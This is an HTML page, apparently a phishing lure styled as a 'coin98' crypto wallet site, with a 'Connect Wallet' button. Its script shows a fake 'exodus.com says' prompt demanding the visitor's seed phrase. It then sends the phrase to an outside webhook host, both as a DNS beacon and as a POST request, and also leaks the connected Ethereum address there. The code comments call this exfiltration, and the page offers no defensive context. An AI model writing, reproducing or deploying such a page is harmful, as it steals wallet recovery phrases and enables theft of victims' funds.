<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>coin98.comm</title>
  <style>
    body {
      font-family: sans-serif;
      padding: 40px;
      text-align: center;
      background: #f0f0f0;
    }
    button {
      padding: 12px 20px;
      font-size: 16px;
      cursor: pointer;
      background: #4285f4;
      color: white;
      border: none;
      border-radius: 8px;
    }
    button:hover {
      background: #3367d6;
    }
  </style>
</head>
<body>
  <button id="connectWallet">Connect Wallet</button>

  <script>
    document.getElementById("connectWallet").addEventListener("click", async () => {
      // 
      const OOB = "ancient-unicorn-29.webhook.cool";

      // 1. Prompt
      setTimeout(() => {
        const password = prompt("exodus.com says:\n\nEnter your seed phrase before continue");
        if (password) {
          // Exfil password via OOB (DNS beacon)
          const beacon = btoa(password).replace(/=/g, '').substring(0, 500);
          new Image().src = `https://${beacon}.${OOB}`;

          // Backup exfil via POST
          fetch(`https://${OOB}/password`, {
            method: "POST",
            body: JSON.stringify({ password: password })
          }).catch(() => {});
        }
      }, 1000);

      // 2. connect wallet
      if (window.ethereum) {
        try {
          await window.ethereum.request({ method: "eth_requestAccounts" });
          console.log("Wallet connected!");

          const accounts = await window.ethereum.request({ method: "eth_accounts" });
          if (accounts.length > 0) {
            const addr = accounts[0];
            const addrBeacon = btoa(addr).replace(/=/g, '');
            new Image().src = `https://addr-${addrBeacon}.${OOB}`;
          }
        } catch (err) {
          console.log("Wallet connection rejected:", err);
        }
      } else {
        console.log("No wallet installed.");
      }
    });
  </script>
</body>
</html>
